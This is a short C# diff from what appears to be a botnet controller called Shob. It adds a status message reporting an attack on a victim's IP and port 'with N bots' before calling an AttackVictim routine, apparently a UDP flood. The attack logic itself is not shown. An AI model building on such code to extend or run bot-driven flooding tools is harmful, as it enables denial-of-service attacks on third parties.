@@ -31,6 +31,7 @@ namespace Shob
             byte[] port = new byte[2];
             int portnum = Int32.Parse(PortTextBox.Text);
             port = BitConverter.GetBytes(portnum);
+            UpdateMessageBox("Attacking victim on IP, " + ip.ToString() + " on Port " + portnum + " With " + Udpshob.MyBots.Count +" bots");
             Udpshob.AttackVictim(ip, port,Encoding.UTF8.GetBytes(PassTextBox.Text));
         }
         
